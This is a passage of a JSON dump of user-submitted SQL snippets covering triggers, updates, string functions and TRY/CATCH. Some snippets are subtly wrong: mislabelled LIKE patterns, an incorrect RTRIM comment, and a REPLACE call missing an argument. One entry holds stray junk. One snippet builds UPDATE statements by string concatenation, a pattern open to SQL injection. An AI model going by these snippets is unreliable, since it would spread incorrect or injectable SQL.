    "description": "                                     CREATE PROCEDURE uspFindProductByModel (     @model_year SMALLINT,     @product_count INT OUTPUT ) AS BEGIN     SELECT          product_name,         list_price     FROM         production.products     WHERE         model_year = @model_year;      SELECT @product_count = @@ROWCOUNT; END; \nCREATE PROCEDURE [dbo].[test_Procedure]  \t@input  VARCHAR(10),     @output VARCHAR(20) output AS   BEGIN       IF @input >= 1         BEGIN             SET @output = 'Result is from procedure';             RETURN;         END   END  DECLARE @get VARCHAR(20);  EXEC test_Procedure 1, @get output SELECT @get \nCopy CodeCREATE PROCEDURE spGetEmployeeCountByGender @Gender nvarchar(20), @EmployeeCount int Output AS BEGIN SELECT @EmployeeCount = COUNT(Id)  FROM tblEmployee  WHERE Gender = @Gender END\n",
    "reg_date": "2021-10-12T10:00:51.000Z"
  },
  {
    "id": 4288,
    "keyword": null,
    "link": null,
    "title": " sql string agg",
    "description": "SELECT STRING_AGG(columnName,',') from tableName\n",
    "reg_date": "2021-10-12T10:00:51.000Z"
  },
  {
    "id": 4289,
    "keyword": null,
    "link": null,
    "title": " sql string function update replace",
    "description": "UPDATE employees  SET      phone_number = REPLACE(phone_number, '.', '-');Code language: SQL (Structured Query Language) (sql)\n",
    "reg_date": "2021-10-12T10:00:51.000Z"
  },
  {
    "id": 4290,
    "keyword": null,
    "link": null,
    "title": " sql string length",
    "description": "SELECT length('abcd') FROM DUAL;\t\t-- Oracle SELECT length('abcd');\t\t\t\t\t-- MySql / PostGreSQL SELECT len('abcd');\t\t\t\t\t\t-- SQL Server\n-- Relevant for SQL-Oracle only  -- syntax LENGTH(<your-string>)  -- example LENGTH('CountCharacters') -- OUTPUT: 15         123456789012345  -- example with query  SELECT 'CountCharacters',LENGTH('CountCharacters') FROM DUAL;  -- OUTPUT: CountCharacters, 15\n-- Relevant for MS SQL (SQL Server) LEN('string')\nSELECT LENGTH('exemple');\n",
    "reg_date": "2021-10-12T10:00:51.000Z"
  },
  {
    "id": 4291,
    "keyword": null,
    "link": null,
    "title": " sql string length postgresql",
    "description": "length()\n",
    "reg_date": "2021-10-12T10:00:51.000Z"
  },
  {
    "id": 4292,
    "keyword": null,
    "link": null,
    "title": " sql string starts with",
    "description": "-- Case insensitive SELECT * FROM my_table WHERE upper(my_column) LIKE 'SEARCHED %';  -- starts with SELECT * FROM my_table WHERE upper(my_column) LIKE '% SEARCHED';  -- ends with SELECT * FROM my_table WHERE upper(my_column) LIKE '%SEARCHED%';  -- contains\n",
    "reg_date": "2021-10-12T10:00:52.000Z"
  },
  {
    "id": 4293,
    "keyword": null,
    "link": null,
    "title": " sql substring",
    "description": "SELECT SUBSTRING('SQL Tutorial', 1, 3) AS ExtractString;\n-- substr(string, start, [, length ]) SELECT substr('Hello World', 1, 3) ;      -- Hel SELECT substr('Hello World', 4, 5) ;      -- lo Wo SELECT substr('Hello World', 4);          -- lo World SELECT substr('Hello World', -3);         -- rld\nSUBSTRING(string, start, length)\nSELECT      SUBSTRING('SQLTutorial.org',         POSITION('.' IN 'SQLTutorial.org'));\nSELECT SUBSTR(first_name, 0 , 3) From employees;\nSELECT SUBSTRING('SQLTutorial.org');\n",
    "reg_date": "2021-10-12T10:00:52.000Z"
  },
  {
    "id": 4294,
    "keyword": null,
    "link": null,
    "title": " sql sum and other fields",
    "description": "SELECT sum(a) as car,b,c FROM toys  GROUP BY b, c \n",
    "reg_date": "2021-10-12T10:00:52.000Z"
  },
  {
    "id": 4295,
    "keyword": null,
    "link": null,
    "title": " sql sum if",
    "description": "/* Count the number of ColumnA lines where ColumnB is above 10 */ SELECT COLUMNA \t , SUM(CASE WHEN COLUMNB > 10 THEN 1 ELSE 0 END) AS COUNT_ABOVE_TEN FROM TABLEA GROUP BY COLUMNA\n",
    "reg_date": "2021-10-12T10:00:52.000Z"
  },
  {
    "id": 4296,
    "keyword": null,
    "link": null,
    "title": " sql sum of all rows",
    "description": "SELECT SUM(amount) FROM orders; SELECT SUM(amount + bonus) FROM orders; SELECT client_id, SUM(amount) FROM orders GROUP BY client_id;\n",
    "reg_date": "2021-10-12T10:00:52.000Z"
  },
  {
    "id": 4297,
    "keyword": null,
    "link": null,
    "title": " sql syntax",
    "description": "select [all/distinct] <COL1>, <COL2>, <COL3> from <TABLE_NAME> [join <JOIN_CONDITION>] [where <CONDITION>] [group by <COLUMN_NAME>] [having <SEARCH_CONDITION>] [order by <SORT_SPECIFICATION>]   /* Specifically for SQL -> Oracle  LEGEND:  [...]   :   optional entries <...>   :   your specific entry */\nUsed alongside a WHERE clause as a shorthand for multiple OR conditions. So instead of: SELECT * FROM users WHERE country = 'USA' OR country = 'United Kingdom' OR country = 'Russia' OR country = 'Australia'; You can use: SELECT * FROM users WHERE country IN ('USA', 'United Kingdom', 'Russia', 'Australia');\n",
    "reg_date": "2021-10-12T10:00:52.000Z"
  },
  {
    "id": 4298,
    "keyword": null,
    "link": null,
    "title": " sql syntax create timestamp column",
    "description": "CREATE TABLE tablename (columnname datetime NOT NULL DEFAULT CURRENT_TIMESTAMP)\n",
    "reg_date": "2021-10-12T10:00:52.000Z"
  },
  {
    "id": 4299,
    "keyword": null,
    "link": null,
    "title": " sql tabelle erstellen",
    "description": " CREATE TABLE tabellennamen (    Spaltenname1 datentyp1 [feldeinschr&auml;nkung]    Spaltenname2 datentyp2 [feldeinschr&auml;nkung]    [...] );\n",
    "reg_date": "2021-10-12T10:00:52.000Z"
  },
  {
    "id": 4300,
    "keyword": null,
    "link": null,
    "title": " sql table alias join",
    "description": "SELECT NAME AS \"Employee Name\" FROM PEOPLE;  SELECT p.NAME AS \"Employee Name\", s.SALARY AS \"Employee Salary\" FROM PEOPLE p JOIN SALARIES s ON p.ID = s.ID;\n",
    "reg_date": "2021-10-12T10:00:52.000Z"
  },
  {
    "id": 4301,
    "keyword": null,
    "link": null,
    "title": " sql time format",
    "description": "SELECT FORMAT(CURRENT_TIMESTAMP, 'yyyy-MM-dd hh:mm:ss tt') \nSELECT CONVERT(VARCHAR, GETDATE(),101) AS DATE SELECT CONVERT(VARCHAR, GETDATE(),102) AS DATE SELECT CONVERT(VARCHAR, GETDATE(),103) AS DATE SELECT CONVERT(VARCHAR, GETDATE(),104) AS DATE SELECT CONVERT(VARCHAR, GETDATE(),105) AS DATE SELECT CONVERT(VARCHAR, GETDATE(),106) AS DATE  SELECT DATE = FORMAT(GETDATE(), 'dd-MM-yyyy') \nSELECT FORMAT(dbo.column, 'M/dd/yyyy')\nDATE - format YYYY-MM-DD DATETIME - format: YYYY-MM-DD HH:MI:SS TIMESTAMP - format: YYYY-MM-DD HH:MI:SS YEAR - format YYYY or YY\ndefault date format of my sql - YYYY-MM-DD\n",
    "reg_date": "2021-10-12T10:00:53.000Z"
  },
  {
    "id": 4302,
    "keyword": null,
    "link": null,
    "title": " sql timestamp to date",
    "description": "date_format(from_unix_time(`my_date`), '%e %b %Y') AS 'date_formatted' cast(my_date as DATE)\n",
    "reg_date": "2021-10-12T10:00:53.000Z"
  },
  {
    "id": 4303,
    "keyword": null,
    "link": null,
    "title": " sql to c# linq converter online",
    "description": "Have you tried Linqer http://www.sqltolinq.com  An SQL-> LINQ converter..  Or LINQPad http://www.linqpad.net/\ndeclare @filterdate select * from employeemaster where empresignationdate is null or cast(emptesignationdate as date )>=@filterdate)\nselect a,b,c from d where a>101 \nselect c.*,s1.BPServicerNameDisplay,s2.BPServicerNameDisplay,s3.BPServicerNameDisplay,s4.BPServicerNameDisplay  from Clients c left join ServicerClientRoles scr1 on c.ClientUID=scr1.clientuid and scr1.ServicerRoleID = 1 left join servicers s1 on scr1.ServicerUID=s1.ServicerUID left join ServicerClientRoles scr2 on c.ClientUID=scr2.clientuid and scr2.ServicerRoleID = 2 left join servicers s2 on scr2.ServicerUID=s2.ServicerUID left join ServicerClientRoles scr3 on c.ClientUID=scr3.clientuid and scr3.ServicerRoleID = 3 left join servicers s3 on scr3.ServicerUID=s3.ServicerUID left join ServicerClientRoles scr4 on c.ClientUID=scr4.clientuid and scr4.ServicerRoleID = 4 left join servicers s4 on scr4.ServicerUID=s4.ServicerUID where c.ClientUID='189A30C0-6AEA-EB11-B838-0050569E34FB'\nSELECT * FROM TABLE\nSELECT * FROM FLDR.FormInstance WHERE FolderVersionID IN (9224) AND FormDesignVersionID = 2593 AND AnchorDocumentID IN (SELECT DISTINCT AnchorDocumentID FROM FLDR.FormInstance WHERE FolderVersionID IN (9224))\n",
    "reg_date": "2021-10-12T10:00:53.000Z"
  },
  {
    "id": 4304,
    "keyword": null,
    "link": null,
    "title": " sql to char",
    "description": "TO_CHAR( sysdate, 'YYYY-MM-DD' )  /*TO_CHAR Format Specifiers  YYYY\t\t\t4-digit year YY\t\t\t\t2-digit year MON\t\t\t\tAbbreviated month (Jan - Dec) MONTH\t\t\tMonth name (January - December) MM\t\t\t\tMonth (1 - 12) DY\t\t\t\tAbbreviated day (Sun - Sat) DD\t\t\t\tDay (1 - 31) HH24\t\t\tHour (0 - 23) HH or HH12\t\tHour (1 - 12) MI\t\t\t\tMinutes (0 - 59) SS\t\t\t\tSeconds (0 - 59)*/\nSELECT   TO_CHAR( sysdate, 'YYYY-MM-DD' ) FROM   dual; \n",
    "reg_date": "2021-10-12T10:00:53.000Z"
  },
  {
    "id": 4305,
    "keyword": null,
    "link": null,
    "title": " sql to char function with date",
    "description": "SELECT   TO_CHAR( sysdate, 'YYYY-MM-DD' ) FROM   dual; \n",
    "reg_date": "2021-10-12T10:00:53.000Z"
  },
  {
    "id": 4306,
    "keyword": null,
    "link": null,
    "title": " sql to mongodb query converter",
    "description": "The simple anwser? No.  The slightly more complex anwser is some people have had luck translating more complex SQL to Mapreduce functions ...  http://rickosborne.org/blog/index.php/2010/02/08/playing-around-with-mongodb-and-mapreduce-functions/  http://rickosborne.org/blog/index.php/2010/02/19/yes-virginia-thats-automated-sql-to-mongodb-mapreduce/  However, that said ... generally speaking you might as well learn mapreduce properly because if the data is in MongoDB already ... you'll really need to know how to properly query MongoDB to get anything meaningful done!  MongoDB has wonderful and helpful docs http://www.mongodb.org/display/DOCS/Advanced+Queries  As well as an easy to use online tutorial: http://try.mongodb.org/\n",
    "reg_date": "2021-10-12T10:00:53.000Z"
  },
  {
    "id": 4307,
    "keyword": null,
    "link": null,
    "title": " sql today at midnight",
    "description": "SELECT DATEADD(d, 0, DATEDIFF(d, 0, GETDATE()))\n",
    "reg_date": "2021-10-12T10:00:53.000Z"
  },
  {
    "id": 4308,
    "keyword": null,
    "link": null,
    "title": " sql top 10",
    "description": "-- SQL Server / MS Access Syntax: SELECT TOP number|percent column_name(s) FROM table_name WHERE condition; -- MySQL Syntax: SELECT column_name(s) FROM table_name WHERE condition LIMIT number; -- Oracle 12 Syntax: SELECT column_name(s) FROM table_name ORDER BY column_name(s)      FETCH FIRST number ROWS ONLY; -- Older Oracle Syntax: SELECT column_name(s) FROM table_name WHERE ROWNUM <= number;\n",
    "reg_date": "2021-10-12T10:00:53.000Z"
  },
  {
    "id": 4309,
    "keyword": null,
    "link": null,
    "title": " sql top 3",
    "description": "-- SQL Server / MS Access Syntax: SELECT TOP number|percent column_name(s) FROM table_name WHERE condition; -- MySQL Syntax: SELECT column_name(s) FROM table_name WHERE condition LIMIT number; -- Oracle 12 Syntax: SELECT column_name(s) FROM table_name ORDER BY column_name(s)      FETCH FIRST number ROWS ONLY; -- Older Oracle Syntax: SELECT column_name(s) FROM table_name WHERE ROWNUM <= number;\nSELECT TOP 3 * from TABLENAME \n",
    "reg_date": "2021-10-12T10:00:53.000Z"
  },
  {
    "id": 4310,
    "keyword": null,
    "link": null,
    "title": " sql track modification",
    "description": "SQLALCHEMY_TRACK_MODIFICATIONS = False\n",
    "reg_date": "2021-10-12T10:00:54.000Z"
  },
  {
    "id": 4311,
    "keyword": null,
    "link": null,
    "title": " sql trigger after insert",
    "description": "-- SQL Server (update my_table2 after insert on my_table1) CREATE TRIGGER trigger_name ON my_table1 FOR INSERT AS BEGIN     UPDATE my_table2 SET my_col_date = getdate() FROM my_table1  END -- Oracle (insert into log table after update on my_table) CREATE OR REPLACE TRIGGER trigger_name AFTER INSERT ON my_table FOR EACH ROW BEGIN     INSERT INTO my_log_table (LOG_DATE, ACTION) VALUES (SYSDATE, 'Changed'); END;\nCREATE TRIGGER trigger_name    ON { Table name or view name }    [ WITH <Options> ]   { FOR | AFTER | INSTEAD OF }    { [INSERT], [UPDATE] , [DELETE] }\t\t\t\n                                     CREATE TRIGGER trigger_name     BEFORE INSERT     ON table_name FOR EACH ROW trigger_body; \n                                     DELIMITER $$  CREATE TRIGGER before_workcenters_insert BEFORE INSERT ON WorkCenters FOR EACH ROW BEGIN     DECLARE rowcount INT;          SELECT COUNT(*)      INTO rowcount     FROM WorkCenterStats;          IF rowcount > 0 THEN         UPDATE WorkCenterStats         SET totalCapacity = totalCapacity + new.capacity;     ELSE         INSERT INTO WorkCenterStats(totalCapacity)         VALUES(new.capacity);     END IF;   END $$  DELIMITER ; \n",
    "reg_date": "2021-10-12T10:00:54.000Z"
  },
  {
    "id": 4312,
    "keyword": null,
    "link": null,
    "title": " sql trigger after update",
    "description": "-- SQL Server (update my_table after update on my_table) CREATE TRIGGER trigger_name ON my_table AFTER UPDATE AS IF UPDATE (col_name)\t-- Optional, for particular column BEGIN     UPDATE my_table SET my_col_date = getdate() FROM my_table  END; -- Oracle (insert into log table after update on my_table) CREATE OR REPLACE TRIGGER trigger_name AFTER UPDATE ON my_table FOR EACH ROW BEGIN     INSERT INTO my_log_table (LOG_DATE, ACTION) VALUES (SYSDATE, 'Changed'); END;\n",
    "reg_date": "2021-10-12T10:00:54.000Z"
  },
  {
    "id": 4313,
    "keyword": null,
    "link": null,
    "title": " sql trigger before delete",
    "description": "CREATE TRIGGER TRG_AUD_DEL ON yourTable FOR DELETE AS      INSERT INTO my_audit_table  (col1, col2, ...)      SELECT col1, col2...      FROM DELETED \n",
    "reg_date": "2021-10-12T10:00:54.000Z"
  },
  {
    "id": 4314,
    "keyword": null,
    "link": null,
    "title": " sql trigger example",
    "description": "-- SQL Server (update my_table after update on my_table) CREATE TRIGGER trigger_name ON my_table AFTER UPDATE AS IF UPDATE (col_name)\t-- Optional, for particular column BEGIN     UPDATE my_table SET my_col_date = getdate() FROM my_table  END; -- Oracle (insert into log table after update on my_table) CREATE OR REPLACE TRIGGER trigger_name AFTER UPDATE ON my_table FOR EACH ROW BEGIN     INSERT INTO my_log_table (LOG_DATE, ACTION) VALUES (SYSDATE, 'Changed'); END;\nCREATE TRIGGER Product_Details_tr  BEFORE INSERT ON Product_Details  FOR EACH ROW  SET NEW.User_ID = CURRENT_USER();\n-- Oracle DB Syntax CREATE OR REPLACE TRIGGER {trigger_name}  BEFORE | AFTER  INSERT | UPDATE | DELETE  ON {table_name} (FOR EACH ROW)  {operation to be executed}  -- for example CREATE TRIGGER log_updates  AFTER INSERT OR UPDATE ON Person FOR EACH ROW  INSERT INTO LogPerson(ts, IdPerson, surname) VALUES(CURRENT_TIMESTAMP, NEW.id, NEW.surname);\nCREATE TRIGGER trigger_name    ON { Table name or view name }    [ WITH <Options> ]   { FOR | AFTER | INSTEAD OF }    { [INSERT], [UPDATE] , [DELETE] }\t\t\t\nCREATE TRIGGER production.trg_product_audit ON production.products AFTER INSERT, DELETE AS BEGIN     SET NOCOUNT ON;     INSERT INTO production.product_audits(         product_id,          product_name,         brand_id,         category_id,         model_year,         list_price,          updated_at,          operation     )     SELECT         i.product_id,         product_name,         brand_id,         category_id,         model_year,         i.list_price,         GETDATE(),         'INS'     FROM         inserted i     UNION ALL     SELECT         d.product_id,         product_name,         brand_id,         category_id,         model_year,         d.list_price,         GETDATE(),         'DEL'     FROM         deleted d; END Code language: SQL (Structured Query Language) (sql)\n-- SQL Server Syntax   -- Trigger on an INSERT, UPDATE, or DELETE statement to a table or view (DML Trigger)      CREATE [ OR ALTER ] TRIGGER [ schema_name . ]trigger_name    ON { table | view }    [ WITH <dml_trigger_option> [ ,...n ] ]   { FOR | AFTER | INSTEAD OF }    { [ INSERT ] [ , ] [ UPDATE ] [ , ] [ DELETE ] }    [ WITH APPEND ]   [ NOT FOR REPLICATION ]    AS { sql_statement  [ ; ] [ ,...n ] | EXTERNAL NAME <method specifier [ ; ] > }      <dml_trigger_option> ::=       [ ENCRYPTION ]       [ EXECUTE AS Clause ]      <method_specifier> ::=       assembly_name.class_name.method_name      \n",
    "reg_date": "2021-10-12T10:00:54.000Z"
  },
  {
    "id": 4315,
    "keyword": null,
    "link": null,
    "title": " sql trigger oracle update",
    "description": "-- SQL Server (update my_table after update on my_table) CREATE TRIGGER trigger_name ON my_table AFTER UPDATE AS IF UPDATE (col_name)\t-- Optional, for particular column BEGIN     UPDATE my_table SET my_col_date = getdate() FROM my_table  END; -- Oracle (insert into log table after update on my_table) CREATE OR REPLACE TRIGGER trigger_name AFTER UPDATE ON my_table FOR EACH ROW BEGIN     INSERT INTO my_log_table (LOG_DATE, ACTION) VALUES (SYSDATE, 'Changed'); END;\n",
    "reg_date": "2021-10-12T10:00:54.000Z"
  },
  {
    "id": 4316,
    "keyword": null,
    "link": null,
    "title": " sql trim all spaces",
    "description": "SELECT TRIM('   Exemple   ');\t\t\t\t\t\t-- 'Exemple' SELECT LTRIM('   Exemple   ');\t\t\t\t\t\t-- 'Exemple   ' SELECT RTRIM('   Exemple   ');\t\t\t\t\t\t-- '   Exemple' SELECT TRIM(BOTH 'x' FROM 'xxxExemplexxx');\t\t\t-- 'Exemple' SELECT TRIM(LEADING 'x' FROM 'xxxExemplexxx');\t\t-- 'Exemplexxx' SELECT LTRIM('xxxExemplexxx', 'x');\t\t\t\t\t-- 'Exemplexxx' SELECT TRIM(TRAILING 'x' FROM 'xxxExemplexxx'); \t-- 'xxxExemple' SELECT RTRIM('xxxExemple', 'x');\t\t\t\t\t-- 'Exemplexxx'\nSelect TRIM (' Word  ')\nSELECT RTRIM(LTRIM(' Word ')) \nSELECT REPLACE(' Hello World ',' ')\n",
    "reg_date": "2021-10-12T10:00:54.000Z"
  },
  {
    "id": 4317,
    "keyword": null,
    "link": null,
    "title": " sql trunc",
    "description": "SELECT TRUNC(TO_DATE('27-OCT-92','DD-MON-YY'), 'YEAR')   \"New Year\" FROM DUAL;   New Year --------- 01-JAN-92  \n-- trunc(date, format)\t\t\t\t\t\tDUAL is for Oracle SELECT trunc(sysdate) FROM DUAL;            -- today 00:00:00 SELECT trunc(sysdate, 'Q') FROM DUAL;       -- 1rst quarter day SELECT trunc(sysdate, 'YEAR') FROM DUAL;    -- 1rst year day SELECT trunc(sysdate, 'MONTH') FROM DUAL;   -- 1rst month day\nTRUNC function returns a date truncated to a specific unit of measure. TRUNC function returns a date truncated to a specific unit of measure.\n",
    "reg_date": "2021-10-12T10:00:54.000Z"
  },
  {
    "id": 4318,
    "keyword": null,
    "link": null,
    "title": " sql try catch",
    "description": "BEGIN TRY   SELECT 1 / 0 AS Error; END TRY BEGIN CATCH   SELECT     ERROR_NUMBER() AS ErrorNumber,     ERROR_STATE() AS ErrorState,     ERROR_SEVERITY() AS ErrorSeverity,     ERROR_PROCEDURE() AS ErrorProcedure,     ERROR_LINE() AS ErrorLine,     ERROR_MESSAGE() AS ErrorMessage; END CATCH;\n // errror handeling in sql server               CREATE PROC usp_divide(     @a decimal,     @b decimal,     @c decimal output ) AS BEGIN     BEGIN TRY         SET @c = @a / @b;     END TRY     BEGIN CATCH         SELECT               ERROR_NUMBER() AS ErrorNumber               ,ERROR_SEVERITY() AS ErrorSeverity               ,ERROR_STATE() AS ErrorState               ,ERROR_PROCEDURE() AS ErrorProcedure               ,ERROR_LINE() AS ErrorLine               ,ERROR_MESSAGE() AS ErrorMessage;       END CATCH END; GO \nBEGIN TRY        { sql_statement | statement_block }   END TRY   BEGIN CATCH        [ { sql_statement | statement_block } ]   END CATCH   [ ; ]  \n                                     CREATE PROC usp_divide(     @a decimal,     @b decimal,     @c decimal output ) AS BEGIN     BEGIN TRY         SET @c = @a / @b;     END TRY     BEGIN CATCH         SELECT               ERROR_NUMBER() AS ErrorNumber               ,ERROR_SEVERITY() AS ErrorSeverity               ,ERROR_STATE() AS ErrorState               ,ERROR_PROCEDURE() AS ErrorProcedure               ,ERROR_LINE() AS ErrorLine               ,ERROR_MESSAGE() AS ErrorMessage;       END CATCH END; GO \n",
    "reg_date": "2021-10-12T10:00:54.000Z"
  },
  {
    "id": 4319,
    "keyword": null,
    "link": null,
    "title": " sql try statement",
    "description": "BEGIN TRY        { sql_statement | statement_block }   END TRY   BEGIN CATCH        [ { sql_statement | statement_block } ]   END CATCH   [ ; ]  \n",
    "reg_date": "2021-10-12T10:00:54.000Z"
  },
  {
    "id": 4320,
    "keyword": null,
    "link": null,
    "title": " sql trying to delete database in use",
    "description": " alter database [MyDatbase] set single_user with rollback immediate   drop database [MyDatabase]\n",
    "reg_date": "2021-10-12T10:00:54.000Z"
  },
  {
    "id": 4321,
    "keyword": null,
    "link": null,
    "title": " sql union",
    "description": "-- UNION: distinct values (slower) SELECT emp_name AS name from employees UNION        SELECT cust_name AS name from customers;  -- UNION ALL: keeps duplicates (faster) SELECT emp_name AS name from employees UNION ALL       SELECT cust_name AS name from customers;\nSELECT expression1, expression2, ... expression_n FROM tables [WHERE conditions] UNION ALL SELECT expression1, expression2, ... expression_n FROM tables [WHERE conditions];\nCombines the results from 2 or more SELECT statements and returns only distinct values. Example: Returns the cities from the events and subscribers tables. SELECT city FROM events UNION SELECT city from subscribers;\nUNION: COMBINES THE RESULT OF 2 QUERY AND REMOVES DUPLICATE ROWS AND SORTS BY FIRST COLUMN \n",
    "reg_date": "2021-10-12T10:00:55.000Z"
  },
  {
    "id": 4322,
    "keyword": null,
    "link": null,
    "title": " sql unique",
    "description": "SELECT DISTINCT column1, column1, ..... FROM TABLE /*DISTINCT WILL NOT SELECT THE SAME VALUES IN SAME COLUMN*/\nUSE AdventureWorks2012;   GO   CREATE TABLE Production.TransactionHistoryArchive4    (      TransactionID int NOT NULL,       CONSTRAINT AK_TransactionID UNIQUE(TransactionID)    );    GO    \nThis constraint ensures all values in a column are unique. Example 1 (MySQL): Adds a unique constraint to the id column when creating a new users table. CREATE TABLE users ( id int NOT NULL, name varchar(255) NOT NULL, UNIQUE (id) ); Example 2 (MySQL): Alters an existing column to add a UNIQUE constraint. ALTER TABLE users ADD UNIQUE (id);\n",
    "reg_date": "2021-10-12T10:00:55.000Z"
  },
  {
    "id": 4323,
    "keyword": null,
    "link": null,
    "title": " sql update alias",
    "description": "UPDATE t SET t.COLUMN = 'UPDATE' FROM DATABASE_TABLE t WHERE t.ID = 1;\n",
    "reg_date": "2021-10-12T10:00:55.000Z"
  },
  {
    "id": 4324,
    "keyword": null,
    "link": null,
    "title": " sql update case-sensitive",
    "description": "SELECT * FROM table_name WHERE UPPER(col_name) LIKE '%SEARCHED%'; SELECT * FROM table_name WHERE col_name LIKE '%Searched%';  -- Case sensitive  SYMBOL\tDESCRIPTION\t(SQL)                       EXAMPLE %\t    zero or more characters\t                bl%      'bl, black, blue, blob' _\t    a single character\t                    h_t      'hot, hat, hit' []\t    any single character within brackets\th[oa]t   'hot, hat', but NOT 'hit' ^\t    any character not in the brackets\t    h[^oa]t  'hit', but NOT 'hot, hat' -\t    a range of characters\t                [a-b]t   'cat, cbt'\n",
    "reg_date": "2021-10-12T10:00:55.000Z"
  },
  {
    "id": 4325,
    "keyword": null,
    "link": null,
    "title": " sql update from different table",
    "description": "# SQL Server UPDATE     Sales_Import SET     Sales_Import.AccountNumber = RAN.AccountNumber FROM     Sales_Import SI INNER JOIN     RetrieveAccountNumber RAN ON      SI.LeadID = RAN.LeadID; # MySQL & MariaDB UPDATE     Sales_Import SI,     RetrieveAccountNumber RAN SET     SI.AccountNumber = RAN.AccountNumber WHERE     SI.LeadID = RAN.LeadID;\n",
    "reg_date": "2021-10-12T10:00:55.000Z"
  },
  {
    "id": 4326,
    "keyword": null,
    "link": null,
    "title": " sql update from select",
    "description": "--update query example  UPDATE table_name  SET column1 = value1, column2 = value2, ...  WHERE condition; \nUPDATE YourTable  SET Col1 = OtherTable.Col1,      Col2 = OtherTable.Col2  FROM (     SELECT ID, Col1, Col2      FROM other_table) AS OtherTable WHERE      OtherTable.ID = YourTable.ID\nUPDATE t1 SET t1.COL1 = t2.COL1, t1.COL2 = t2.COL2 FROM MY_TABLE AS t1 JOIN MY_OTHER_TABLE AS t2 ON t1.COLID = t2.ID WHERE t1.COL3 = 'OK';\n--the simplest way of doing this  UPDATE     table_to_update,     table_info SET     table_to_update.col1 = table_info.col1,     table_to_update.col2 = table_info.col2  WHERE     table_to_update.ID = table_info.ID\n",
    "reg_date": "2021-10-12T10:00:55.000Z"
  },
  {
    "id": 4327,
    "keyword": null,
    "link": null,
    "title": " sql update multiple columns from another table",
    "description": "-- Oracle UPDATE table2 t2 SET (VALUE1, VALUE2) =      (SELECT COL1 AS VALUE1, COL1 AS VALUE2 FROM table1 t1 WHERE t1.ID = t2.ID); -- SQL Server UPDATE table2 t2 SET     t2.VALUE1 = t1.COL1,     t2.VALUE2 = t1.COL2 FROM table1 t1 INNER JOIN t2 ON t1.ID = t2.ID; -- MySQL UPDATE table2 t2 INNER JOIN table1 t1 USING (ID) SET T2.VALUE1 = t1.COL1, t2.VALUE2 = t1.COL2;\n",
    "reg_date": "2021-10-12T10:00:55.000Z"
  },
  {
    "id": 4328,
    "keyword": null,
    "link": null,
    "title": " sql update query",
    "description": "--update query example  UPDATE table_name  SET column1 = value1, column2 = value2, ...  WHERE condition; \nUPDATE YourTable  SET Col1 = OtherTable.Col1,      Col2 = OtherTable.Col2  FROM (     SELECT ID, Col1, Col2      FROM other_table) AS OtherTable WHERE      OtherTable.ID = YourTable.ID\nUPDATE table_name SET column1 = value1, column2 = value2, ... WHERE condition\nUPDATE table_name SET column1 = value1, column2 = value2...., columnN = valueN WHERE [condition]; \n200000\nsrouboa \n",
    "reg_date": "2021-10-12T10:00:55.000Z"
  },
  {
    "id": 4329,
    "keyword": null,
    "link": null,
    "title": " sql update record",
    "description": "--update query example  UPDATE table_name  SET column1 = value1, column2 = value2, ...  WHERE condition; \nUPDATE YourTable  SET Col1 = OtherTable.Col1,      Col2 = OtherTable.Col2  FROM (     SELECT ID, Col1, Col2      FROM other_table) AS OtherTable WHERE      OtherTable.ID = YourTable.ID\nUPDATE table_name SET column1 = value1, column2 = value2...., columnN = valueN WHERE [condition]; \nMit UPATE werden  Datenwerte in der Datenbank aktualisiert. Nach Bed&uuml;rfnis k&ouml;nnen auch mehrere Datens&auml;tze auf einmal ver&auml;ndert werden. Mit WHERE werden nur bestimmte Datens&auml;tze zu aktualisiert.    UPDATE suppliers       SET supplier_id = 50,       supplier_name = 'Apple',       city = 'Cupertino'   WHERE       supplier_name = 'Google'; \n-- sql update using string format  String = \"UPDATE yourtable SET yourcolumn = '\" + yourvealueintext + \"' WHERE column = \" + item_to_compare_the_position_of_Your_Column;                                            -- or                                             String = \"UPDATE yourtable SET yourcolumn = \" + yourvalue_in_number + \" WHERE column = \" + item_to_compare_the_position_of_Your_Column;\nSQL> UPDATE CUSTOMERS SET ADDRESS = 'Pune' WHERE ID = 6;\n",
    "reg_date": "2021-10-12T10:00:55.000Z"
  },
  {
    "id": 4330,
    "keyword": null,
    "link": null,
    "title": " sql update table remove spaces",
    "description": "LTRIM(RTRIM(ColumnName))\n",
    "reg_date": "2021-10-12T10:00:56.000Z"
  },
  {
    "id": 4331,
    "keyword": null,
    "link": null,
    "title": " sql update top 100",
    "description": "update top (100) table1 set field1 = 1 \nupdate top (100) table1 set field1 = 1\n",
    "reg_date": "2021-10-12T10:00:56.000Z"
  },
  {
    "id": 4332,
    "keyword": null,
    "link": null,
    "title": " sql update trigger check if value has changed",
    "description": "-- SQL Server (update my_table after update on my_table) CREATE TRIGGER trigger_name ON my_table AFTER UPDATE AS IF UPDATE (col_name)\t-- Optional, for particular column BEGIN     UPDATE my_table SET my_col_date = getdate() FROM my_table  END; -- Oracle (insert into log table after update on my_table) CREATE OR REPLACE TRIGGER trigger_name AFTER UPDATE ON my_table FOR EACH ROW BEGIN     INSERT INTO my_log_table (LOG_DATE, ACTION) VALUES (SYSDATE, 'Changed'); END;\n",
    "reg_date": "2021-10-12T10:00:56.000Z"
  },
  {
    "id": 4333,
    "keyword": null,
    "link": null,
    "title": " sql update trigger only when column is modified",
    "description": "-- SQL Server (update my_table after update on my_table) CREATE TRIGGER trigger_name ON my_table AFTER UPDATE AS IF UPDATE (col_name)\t-- Optional, for particular column BEGIN     UPDATE my_table SET my_col_date = getdate() FROM my_table  END; -- Oracle (insert into log table after update on my_table) CREATE OR REPLACE TRIGGER trigger_name AFTER UPDATE ON my_table FOR EACH ROW BEGIN     INSERT INTO my_log_table (LOG_DATE, ACTION) VALUES (SYSDATE, 'Changed'); END;\n",
    "reg_date": "2021-10-12T10:00:56.000Z"
  },
  {
    "id": 4334,
    "keyword": null,
    "link": null,
    "title": " sql update with statement",
    "description": "--update query example  UPDATE table_name  SET column1 = value1, column2 = value2, ...  WHERE condition; \nUPDATE table_name SET column1 = value1, column2 = value2...., columnN = valueN WHERE [condition]; \nUPDATE mytable t\t\t-- Update using WITH statement SET value3 = (     WITH comp AS (         SELECT id, value1         FROM mytable t         WHERE value2 > 10     )     SELECT c.value1     FROM comp c     WHERE c.id = t.id );\n",
    "reg_date": "2021-10-12T10:00:56.000Z"
  },
  {
    "id": 4335,
    "keyword": null,
    "link": null,
    "title": " sql upsert",
    "description": "update table1  set name = 'val2', itemname = 'val3', itemcatName = 'val4', itemQty = 'val5' where id = 'val1' if @@ROWCOUNT = 0 insert into table1(id, name, itemname, itemcatName, itemQty) values('val1', 'val2', 'val3', 'val4', 'val5')\n",
